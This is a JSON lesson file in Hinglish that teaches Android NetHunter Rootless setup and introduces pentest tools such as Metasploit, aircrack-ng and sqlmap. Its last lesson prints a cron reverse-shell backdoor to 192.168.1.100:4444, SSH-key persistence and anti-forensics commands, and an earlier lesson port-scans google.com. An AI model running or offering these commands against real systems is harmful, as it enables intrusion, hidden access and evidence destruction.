@@ -1,0 +1,893 @@
+{
+  "moduleTitle": "Module 3: NetHunter Rootless",
+  "moduleDescription": "Bina root ke Kali Linux tools use karna - NetHunter Rootless installation aur setup",
+  "lessons": [
+    {
+      "id": 1,
+      "title": "NetHunter Kya Hai?",
+      "content": {
+        "intro": "NetHunter ek mobile penetration testing platform hai jo Android devices pe Kali Linux tools run karta hai. Rootless version bina root ke kaam karta hai.",
+        "sections": [
+          {
+            "heading": "NetHunter Rootless Kyu Use Kare?",
+            "text": "• Bina root ke Kali Linux tools use kar sakte hain\n• Phone ki warranty void nahi hoti\n• Safe aur secure - system files touch nahi karta\n• Portable penetration testing lab\n• Professional ethical hacking tools access"
+          },
+          {
+            "heading": "System Requirements",
+            "text": "• Android 7.0+ (API level 24+)\n• 4GB+ RAM (recommended)\n• 8GB+ free storage\n• Stable internet connection\n• Termux app installed"
+          },
+          {
+            "heading": "Prerequisites Install",
+            "commands": [
+              {
+                "description": "Termux Update",
+                "command": "pkg update && pkg upgrade -y",
+                "explanation": "Termux ko latest version mein update karta hai"
+              },
+              {
+                "description": "Required Packages",
+                "command": "pkg install wget curl proot tar -y",
+                "explanation": "NetHunter installation ke liye zaroori packages"
+              },
+              {
+                "description": "Storage Permission",
+                "command": "termux-setup-storage",
+                "explanation": "Storage access permission deta hai"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 2,
+      "title": "NetHunter Installation",
+      "content": {
+        "intro": "Step by step NetHunter Rootless install karna seekhiye. Installation process time lagti hai lekin result worth hai.",
+        "sections": [
+          {
+            "heading": "Installation Script Download",
+            "commands": [
+              {
+                "description": "NetHunter Installer Download",
+                "command": "wget -O install-nethunter-termux https://offs.ec/2MceZWr",
+                "explanation": "Official NetHunter installation script download karta hai"
+              },
+              {
+                "description": "Script Executable Banaye",
+                "command": "chmod +x install-nethunter-termux",
+                "explanation": "Installation script ko executable permission deta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Installation Start",
+            "commands": [
+              {
+                "description": "NetHunter Install",
+                "command": "./install-nethunter-termux",
+                "explanation": "NetHunter installation start karta hai (30-60 minutes lagenge)"
+              }
+            ],
+            "text": "Installation ke dauran:\n• Internet connection stable rakhe\n• Phone ko charge mein rakhe\n• Termux app background mein na jane de\n• Patience rakhe - process slow hai"
+          },
+          {
+            "heading": "Installation Verification",
+            "commands": [
+              {
+                "description": "NetHunter Start",
+                "command": "nethunter",
+                "explanation": "NetHunter environment start karta hai"
+              },
+              {
+                "description": "Kali Version Check",
+                "command": "cat /etc/os-release",
+                "explanation": "Installed Kali Linux version dikhata hai"
+              }
+            ]
+          },
+          {
+            "heading": "Alternative Installation Method",
+            "text": "Agar upar wala method fail ho jaye:",
+            "commands": [
+              {
+                "description": "Manual Download",
+                "command": "wget https://kali.download/nethunter-images/current/rootfs/kalifs-arm64-minimal.tar.xz",
+                "explanation": "Kali rootfs manually download karta hai"
+              },
+              {
+                "description": "Extract Rootfs",
+                "command": "proot --link2symlink tar -xf kalifs-arm64-minimal.tar.xz",
+                "explanation": "Downloaded rootfs extract karta hai"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 3,
+      "title": "Kali Linux Environment Setup",
+      "content": {
+        "intro": "NetHunter install hone ke baad Kali Linux environment properly configure karna aur basic tools setup karna.",
+        "sections": [
+          {
+            "heading": "First Time Setup",
+            "commands": [
+              {
+                "description": "Kali Environment Start",
+                "command": "nethunter",
+                "explanation": "Kali Linux chroot environment start karta hai"
+              },
+              {
+                "description": "Package Lists Update",
+                "command": "apt update",
+                "explanation": "Kali package repositories update karta hai"
+              },
+              {
+                "description": "System Upgrade",
+                "command": "apt upgrade -y",
+                "explanation": "Installed packages ko latest version mein upgrade karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Essential Tools Install",
+            "commands": [
+              {
+                "description": "Basic Tools",
+                "command": "apt install nano curl wget git -y",
+                "explanation": "Basic utilities install karta hai"
+              },
+              {
+                "description": "Network Tools",
+                "command": "apt install nmap netcat-traditional dnsutils -y",
+                "explanation": "Network analysis tools install karta hai"
+              },
+              {
+                "description": "Python Tools",
+                "command": "apt install python3 python3-pip -y",
+                "explanation": "Python aur pip install karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "User Configuration",
+            "commands": [
+              {
+                "description": "Root Password Set",
+                "command": "passwd",
+                "explanation": "Root user ka password set karta hai"
+              },
+              {
+                "description": "New User Create",
+                "command": "adduser kali",
+                "explanation": "Kali user account banata hai"
+              },
+              {
+                "description": "Sudo Privileges",
+                "command": "usermod -aG sudo kali",
+                "explanation": "Kali user ko sudo permissions deta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Environment Variables",
+            "commands": [
+              {
+                "description": "Bashrc Edit",
+                "command": "nano ~/.bashrc",
+                "explanation": "Bash configuration file edit karta hai"
+              }
+            ],
+            "text": "Bashrc mein ye lines add kariye:\n\nexport PATH=$PATH:/usr/local/bin\nexport TERM=xterm-256color\nalias ll='ls -la'\nalias la='ls -A'\nalias l='ls -CF'"
+          }
+        ]
+      }
+    },
+    {
+      "id": 4,
+      "title": "VNC Server Setup",
+      "content": {
+        "intro": "Graphical interface ke liye VNC server setup karna. VNC se aap Kali Linux ko GUI mode mein use kar sakte hain.",
+        "sections": [
+          {
+            "heading": "VNC Server Installation",
+            "commands": [
+              {
+                "description": "VNC Server Install",
+                "command": "apt install tightvncserver -y",
+                "explanation": "Lightweight VNC server install karta hai"
+              },
+              {
+                "description": "Desktop Environment",
+                "command": "apt install xfce4 xfce4-goodies -y",
+                "explanation": "XFCE desktop environment install karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "VNC Configuration",
+            "commands": [
+              {
+                "description": "VNC Password Set",
+                "command": "vncpasswd",
+                "explanation": "VNC connection ke liye password set karta hai"
+              },
+              {
+                "description": "VNC Server Start",
+                "command": "vncserver :1 -geometry 1024x768",
+                "explanation": "VNC server port 1 pe 1024x768 resolution mein start karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Startup Script Configuration",
+            "commands": [
+              {
+                "description": "Startup Script Edit",
+                "command": "nano ~/.vnc/xstartup",
+                "explanation": "VNC startup configuration edit karta hai"
+              }
+            ],
+            "text": "xstartup file mein ye content add kariye:\n\n#!/bin/bash\nxrdb $HOME/.Xresources\nstartxfce4 &"
+          },
+          {
+            "heading": "VNC Management",
+            "commands": [
+              {
+                "description": "VNC Server Stop",
+                "command": "vncserver -kill :1",
+                "explanation": "VNC server ko stop karta hai"
+              },
+              {
+                "description": "VNC Sessions List",
+                "command": "vncserver -list",
+                "explanation": "Running VNC sessions dikhata hai"
+              },
+              {
+                "description": "VNC Restart",
+                "command": "vncserver :1 -geometry 1280x720",
+                "explanation": "VNC server different resolution mein restart karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "VNC Client Apps",
+            "text": "Mobile pe VNC connect karne ke liye ye apps use kariye:\n\n• VNC Viewer (RealVNC) - Free aur reliable\n• bVNC - Lightweight aur fast\n• MultiVNC - Advanced features\n\nConnection Details:\n• Address: localhost:5901\n• Password: Jo aapne set kiya hai"
+          }
+        ]
+      }
+    },
+    {
+      "id": 5,
+      "title": "Basic Tools Testing",
+      "content": {
+        "intro": "NetHunter setup complete hone ke baad important tools test karna aur basic usage seekhna.",
+        "sections": [
+          {
+            "heading": "Network Tools Testing",
+            "commands": [
+              {
+                "description": "Nmap Version Check",
+                "command": "nmap --version",
+                "explanation": "Nmap installation verify karta hai"
+              },
+              {
+                "description": "Simple Network Scan",
+                "command": "nmap -sn 192.168.1.0/24",
+                "explanation": "Local network mein live hosts find karta hai"
+              },
+              {
+                "description": "Port Scan Test",
+                "command": "nmap -sS google.com",
+                "explanation": "Google ke open ports scan karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Web Tools Testing",
+            "commands": [
+              {
+                "description": "Curl Test",
+                "command": "curl -I https://google.com",
+                "explanation": "HTTP headers fetch karta hai"
+              },
+              {
+                "description": "Wget Test",
+                "command": "wget --spider https://google.com",
+                "explanation": "Website connectivity test karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Python Tools Testing",
+            "commands": [
+              {
+                "description": "Python Version",
+                "command": "python3 --version",
+                "explanation": "Python installation check karta hai"
+              },
+              {
+                "description": "Pip Install Test",
+                "command": "pip3 install requests",
+                "explanation": "Python package installation test karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "System Information",
+            "commands": [
+              {
+                "description": "System Info",
+                "command": "uname -a",
+                "explanation": "System information dikhata hai"
+              },
+              {
+                "description": "Disk Usage",
+                "command": "df -h",
+                "explanation": "Disk space usage dikhata hai"
+              },
+              {
+                "description": "Memory Usage",
+                "command": "free -h",
+                "explanation": "RAM usage dikhata hai"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 6,
+      "title": "Troubleshooting & Tips",
+      "content": {
+        "intro": "Common issues aur unke solutions, performance optimization tips aur best practices.",
+        "sections": [
+          {
+            "heading": "Common Issues & Solutions",
+            "text": "Issue 1: NetHunter start nahi ho raha\nSolution: Termux restart kariye aur phir nethunter command run kariye\n\nIssue 2: VNC connect nahi ho raha\nSolution: VNC server restart kariye aur port check kariye\n\nIssue 3: Tools install nahi ho rahe\nSolution: apt update run kariye aur internet connection check kariye"
+          },
+          {
+            "heading": "Performance Optimization",
+            "commands": [
+              {
+                "description": "Cache Clear",
+                "command": "apt clean",
+                "explanation": "Package cache clear kar ke space free karta hai"
+              },
+              {
+                "description": "Unnecessary Packages Remove",
+                "command": "apt autoremove -y",
+                "explanation": "Unused packages remove karta hai"
+              },
+              {
+                "description": "Temp Files Clean",
+                "command": "rm -rf /tmp/*",
+                "explanation": "Temporary files delete karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Backup & Restore",
+            "commands": [
+              {
+                "description": "NetHunter Backup",
+                "command": "tar -czf nethunter-backup.tar.gz /data/data/com.termux/files/usr/var/lib/proot-distro/installed-rootfs/nethunter/",
+                "explanation": "NetHunter installation ka backup banata hai"
+              },
+              {
+                "description": "Configuration Backup",
+                "command": "cp -r ~/.vnc ~/vnc-backup",
+                "explanation": "VNC configuration backup karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Best Practices",
+            "text": "• Regular updates karte rahe: apt update && apt upgrade\n• VNC server use ke baad stop kar de: vncserver -kill :1\n• Unnecessary tools install na kare - space bachaye\n• Important data ka backup rakhe\n• Battery optimization disable kare Termux ke liye\n• Stable internet connection use kare"
+          },
+          {
+            "heading": "Useful Aliases",
+            "commands": [
+              {
+                "description": "Aliases Add",
+                "command": "nano ~/.bashrc",
+                "explanation": "Useful shortcuts add karte hain"
+              }
+            ],
+            "text": "Bashrc mein ye aliases add kariye:\n\nalias nh='nethunter'\nalias update='apt update && apt upgrade'\nalias vncstart='vncserver :1 -geometry 1024x768'\nalias vncstop='vncserver -kill :1'\nalias ll='ls -la'\nalias ..='cd ..'"
+          }
+        ]
+      }
+    },
+    {
+      "id": 7,
+      "title": "Metasploit Framework Setup",
+      "content": {
+        "intro": "Metasploit - world ka sabse famous penetration testing framework. NetHunter mein Metasploit install aur configure karna.",
+        "sections": [
+          {
+            "heading": "Metasploit Installation",
+            "commands": [
+              {
+                "description": "Metasploit Install",
+                "command": "apt install metasploit-framework -y",
+                "explanation": "Complete Metasploit framework install karta hai (time lagega)"
+              },
+              {
+                "description": "Database Setup",
+                "command": "systemctl start postgresql",
+                "explanation": "PostgreSQL database service start karta hai"
+              },
+              {
+                "description": "MSF Database Init",
+                "command": "msfdb init",
+                "explanation": "Metasploit database initialize karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "First Time Setup",
+            "commands": [
+              {
+                "description": "Metasploit Console",
+                "command": "msfconsole",
+                "explanation": "Metasploit console start karta hai"
+              },
+              {
+                "description": "Database Status Check",
+                "command": "db_status",
+                "explanation": "Database connection verify karta hai (msfconsole ke andar)"
+              },
+              {
+                "description": "Update Metasploit",
+                "command": "msfupdate",
+                "explanation": "Latest exploits aur payloads download karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Basic Commands Practice",
+            "commands": [
+              {
+                "description": "Help Command",
+                "command": "help",
+                "explanation": "Available commands list dikhata hai"
+              },
+              {
+                "description": "Search Exploits",
+                "command": "search windows",
+                "explanation": "Windows related exploits search karta hai"
+              },
+              {
+                "description": "Show Payloads",
+                "command": "show payloads",
+                "explanation": "Available payloads list karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Simple Exploit Example",
+            "text": "Educational purpose ke liye basic example:",
+            "commands": [
+              {
+                "description": "Use Exploit",
+                "command": "use auxiliary/scanner/portscan/tcp",
+                "explanation": "Port scanner module select karta hai"
+              },
+              {
+                "description": "Show Options",
+                "command": "show options",
+                "explanation": "Module ke options dikhata hai"
+              },
+              {
+                "description": "Set Target",
+                "command": "set RHOSTS 192.168.1.1",
+                "explanation": "Target IP address set karta hai"
+              },
+              {
+                "description": "Run Scan",
+                "command": "run",
+                "explanation": "Port scan execute karta hai"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 8,
+      "title": "Wireless Security Tools",
+      "content": {
+        "intro": "WiFi security testing tools setup aur basic usage. Aircrack-ng suite aur wireless monitoring tools.",
+        "sections": [
+          {
+            "heading": "Aircrack-ng Suite Installation",
+            "commands": [
+              {
+                "description": "Aircrack Suite Install",
+                "command": "apt install aircrack-ng -y",
+                "explanation": "Complete aircrack-ng wireless tools install karta hai"
+              },
+              {
+                "description": "Wireless Tools",
+                "command": "apt install wireless-tools -y",
+                "explanation": "Additional wireless utilities install karta hai"
+              },
+              {
+                "description": "Reaver Install",
+                "command": "apt install reaver -y",
+                "explanation": "WPS attack tool install karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Tool Verification",
+            "commands": [
+              {
+                "description": "Aircrack Version",
+                "command": "aircrack-ng --help",
+                "explanation": "Aircrack-ng installation verify karta hai"
+              },
+              {
+                "description": "Airodump Check",
+                "command": "airodump-ng --help",
+                "explanation": "Airodump-ng tool check karta hai"
+              },
+              {
+                "description": "Aireplay Check",
+                "command": "aireplay-ng --help",
+                "explanation": "Aireplay-ng tool verify karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Wordlist Setup",
+            "commands": [
+              {
+                "description": "Wordlists Install",
+                "command": "apt install wordlists -y",
+                "explanation": "Common password wordlists install karta hai"
+              },
+              {
+                "description": "Rockyou Wordlist",
+                "command": "gunzip /usr/share/wordlists/rockyou.txt.gz",
+                "explanation": "Famous rockyou wordlist extract karta hai"
+              },
+              {
+                "description": "Custom Wordlist Create",
+                "command": "crunch 8 8 0123456789 > numbers.txt",
+                "explanation": "8 digit numeric wordlist generate karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Basic Usage Examples",
+            "text": "Note: Ye commands sirf educational purpose ke liye hain. Sirf apne network pe test kare.",
+            "commands": [
+              {
+                "description": "Capture File Analysis",
+                "command": "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap",
+                "explanation": "Captured handshake file crack karta hai"
+              },
+              {
+                "description": "WEP Key Recovery",
+                "command": "aircrack-ng -b 00:11:22:33:44:55 wep_capture.cap",
+                "explanation": "WEP encrypted network crack karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Important Notes",
+            "text": "⚠️ Legal Warning:\n• Sirf apne network pe test kare\n• Permission ke bina kisi aur ka WiFi test na kare\n• Educational purpose only\n• Illegal activities ke liye use na kare\n\n📱 Mobile Limitations:\n• External WiFi adapter zaroori hai\n• Monitor mode support chahiye\n• Root access better results deta hai"
+          }
+        ]
+      }
+    },
+    {
+      "id": 9,
+      "title": "Advanced Tools & Automation",
+      "content": {
+        "intro": "Advanced penetration testing tools aur automation scripts setup. Professional level tools ka introduction.",
+        "sections": [
+          {
+            "heading": "Social Engineering Tools",
+            "commands": [
+              {
+                "description": "SET Install",
+                "command": "apt install set -y",
+                "explanation": "Social Engineering Toolkit install karta hai"
+              },
+              {
+                "description": "SET Start",
+                "command": "setoolkit",
+                "explanation": "Social Engineering Toolkit launch karta hai"
+              },
+              {
+                "description": "Maltego Install",
+                "command": "apt install maltego -y",
+                "explanation": "OSINT aur link analysis tool install karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Web Application Testing",
+            "commands": [
+              {
+                "description": "Sqlmap Install",
+                "command": "apt install sqlmap -y",
+                "explanation": "SQL injection testing tool install karta hai"
+              },
+              {
+                "description": "Nikto Install",
+                "command": "apt install nikto -y",
+                "explanation": "Web vulnerability scanner install karta hai"
+              },
+              {
+                "description": "Dirb Install",
+                "command": "apt install dirb -y",
+                "explanation": "Directory brute force tool install karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Quick Testing Examples",
+            "commands": [
+              {
+                "description": "Sqlmap Basic Test",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --dbs",
+                "explanation": "Test website pe SQL injection test karta hai"
+              },
+              {
+                "description": "Nikto Web Scan",
+                "command": "nikto -h http://testphp.vulnweb.com",
+                "explanation": "Web application vulnerability scan karta hai"
+              },
+              {
+                "description": "Directory Scan",
+                "command": "dirb http://testphp.vulnweb.com",
+                "explanation": "Hidden directories find karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Automation Scripts",
+            "commands": [
+              {
+                "description": "Auto Recon Script",
+                "command": "nano auto_recon.sh",
+                "explanation": "Automated reconnaissance script banata hai"
+              }
+            ],
+            "text": "Auto recon script content:\n\n#!/bin/bash\necho \"Starting Auto Recon for $1\"\nnmap -sS -O $1 > nmap_scan.txt\nnikto -h $1 > nikto_scan.txt\ndirb http://$1 > dirb_scan.txt\necho \"Recon completed. Check output files.\""
+          },
+          {
+            "heading": "Tool Management",
+            "commands": [
+              {
+                "description": "All Tools Update",
+                "command": "apt update && apt upgrade -y",
+                "explanation": "Sare tools latest version mein update karta hai"
+              },
+              {
+                "description": "Tool List",
+                "command": "apt list --installed | grep -E '(nmap|metasploit|aircrack|sqlmap)'",
+                "explanation": "Installed security tools list karta hai"
+              },
+              {
+                "description": "Cleanup",
+                "command": "apt autoremove -y && apt autoclean",
+                "explanation": "Unnecessary files aur packages clean karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Next Steps",
+            "text": "🎯 Congratulations! Aapne NetHunter Rootless successfully setup kar liya hai.\n\nAb aap ye kar sakte hain:\n• Module 4 mein specific tools ki detailed usage seekhe\n• Real-world scenarios practice kare\n• Ethical hacking certifications prepare kare\n• Bug bounty programs join kare\n\n⚠️ Remember: Always stay ethical aur legal boundaries mein rahe!"
+          }
+        ]
+      }
+    },
+    {
+      "id": 10,
+      "title": "Penetration Testing Methodology",
+      "content": {
+        "intro": "Professional penetration testing methodology - systematic approach se security assessment karna. Industry standards aur best practices.",
+        "sections": [
+          {
+            "heading": "PTES (Penetration Testing Execution Standard)",
+            "text": "PTES ke 7 phases:\n\n1. Pre-engagement Interactions\n2. Intelligence Gathering\n3. Threat Modeling\n4. Vulnerability Analysis\n5. Exploitation\n6. Post Exploitation\n7. Reporting"
+          },
+          {
+            "heading": "OWASP Testing Guide",
+            "commands": [
+              {
+                "description": "OWASP ZAP Install",
+                "command": "apt install zaproxy -y",
+                "explanation": "OWASP ZAP web application security scanner"
+              },
+              {
+                "description": "OWASP Testing Checklist",
+                "command": "wget https://github.com/OWASP/wstg/raw/master/checklist/WSTG-Checklist.xlsx",
+                "explanation": "OWASP testing checklist download karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "NIST Cybersecurity Framework",
+            "text": "NIST Framework ke 5 functions:\n\n• Identify - Asset inventory aur risk assessment\n• Protect - Safeguards aur security controls\n• Detect - Monitoring aur detection systems\n• Respond - Incident response procedures\n• Recover - Recovery planning aur improvements"
+          },
+          {
+            "heading": "Automated Reconnaissance",
+            "commands": [
+              {
+                "description": "Recon-ng Install",
+                "command": "apt install recon-ng -y",
+                "explanation": "Modular reconnaissance framework"
+              },
+              {
+                "description": "TheHarvester",
+                "command": "apt install theharvester -y",
+                "explanation": "Email, subdomain, IP harvesting tool"
+              },
+              {
+                "description": "Maltego Install",
+                "command": "apt install maltego -y",
+                "explanation": "Link analysis aur data mining tool"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 11,
+      "title": "Mobile Device Security Testing",
+      "content": {
+        "intro": "Mobile devices aur applications ki security testing. Android aur iOS security assessment techniques.",
+        "sections": [
+          {
+            "heading": "Android Security Testing",
+            "commands": [
+              {
+                "description": "ADB Install",
+                "command": "apt install android-tools-adb -y",
+                "explanation": "Android Debug Bridge install karta hai"
+              },
+              {
+                "description": "Device Connection",
+                "command": "adb devices",
+                "explanation": "Connected Android devices list karta hai"
+              },
+              {
+                "description": "APK Pull",
+                "command": "adb pull /data/app/com.example.app/base.apk",
+                "explanation": "Device se APK file extract karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "APK Analysis Tools",
+            "commands": [
+              {
+                "description": "APKTool Install",
+                "command": "apt install apktool -y",
+                "explanation": "APK reverse engineering tool"
+              },
+              {
+                "description": "APK Decompile",
+                "command": "apktool d app.apk",
+                "explanation": "APK file ko decompile karta hai"
+              },
+              {
+                "description": "Jadx Install",
+                "command": "apt install jadx -y",
+                "explanation": "Java decompiler for Android APK"
+              }
+            ]
+          },
+          {
+            "heading": "Mobile Network Testing",
+            "commands": [
+              {
+                "description": "Burp Mobile Assistant",
+                "command": "java -jar burpsuite.jar",
+                "explanation": "Mobile app traffic analysis ke liye Burp setup"
+              },
+              {
+                "description": "Proxy Setup",
+                "command": "adb shell settings put global http_proxy 192.168.1.100:8080",
+                "explanation": "Android device mein proxy settings"
+              }
+            ]
+          },
+          {
+            "heading": "Mobile Malware Analysis",
+            "text": "Mobile malware analysis steps:\n\n1. Static Analysis - Code review without execution\n2. Dynamic Analysis - Runtime behavior monitoring\n3. Network Analysis - Traffic monitoring\n4. Behavioral Analysis - System interactions\n\nCommon Android malware types:\n• Banking Trojans\n• SMS Trojans\n• Adware\n• Spyware\n• Ransomware"
+          }
+        ]
+      }
+    },
+    {
+      "id": 12,
+      "title": "Advanced Exploitation Techniques",
+      "content": {
+        "intro": "Advanced exploitation techniques - buffer overflows, privilege escalation, persistence mechanisms aur advanced attack vectors.",
+        "sections": [
+          {
+            "heading": "Buffer Overflow Basics",
+            "text": "Buffer Overflow attack process:\n\n1. Vulnerability Discovery\n2. Crash Analysis\n3. Control EIP/RIP\n4. Bad Character Analysis\n5. Find JMP ESP\n6. Generate Shellcode\n7. Exploit Development",
+            "commands": [
+              {
+                "description": "Pattern Create",
+                "command": "msf-pattern_create -l 1000",
+                "explanation": "Buffer overflow testing ke liye pattern generate karta hai"
+              },
+              {
+                "description": "Pattern Offset",
+                "command": "msf-pattern_offset -q 41414141",
+                "explanation": "EIP overwrite offset find karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Privilege Escalation",
+            "commands": [
+              {
+                "description": "Linux Enum Script",
+                "command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
+                "explanation": "Linux privilege escalation enumeration script"
+              },
+              {
+                "description": "SUID Files Find",
+                "command": "find / -perm -4000 -type f 2>/dev/null",
+                "explanation": "SUID bit set files find karta hai"
+              },
+              {
+                "description": "Kernel Exploits",
+                "command": "searchsploit linux kernel",
+                "explanation": "Kernel exploits search karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Persistence Mechanisms",
+            "commands": [
+              {
+                "description": "Cron Job Backdoor",
+                "command": "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\"' | crontab -",
+                "explanation": "Cron job se persistent access"
+              },
+              {
+                "description": "SSH Key Persistence",
+                "command": "echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys",
+                "explanation": "SSH public key add kar ke persistent access"
+              }
+            ]
+          },
+          {
+            "heading": "Anti-Forensics Techniques",
+            "commands": [
+              {
+                "description": "Log Cleanup",
+                "command": "history -c && history -w",
+                "explanation": "Command history clear karta hai"
+              },
+              {
+                "description": "Timestamp Manipulation",
+                "command": "touch -r /etc/passwd malicious_file",
+                "explanation": "File timestamp modify karta hai"
+              },
+              {
+                "description": "Secure Delete",
+                "command": "shred -vfz -n 3 sensitive_file",
+                "explanation": "File ko securely delete karta hai"
+              }
+            ]
+          }
+        ]
+      }
+    }
+  ]
+}
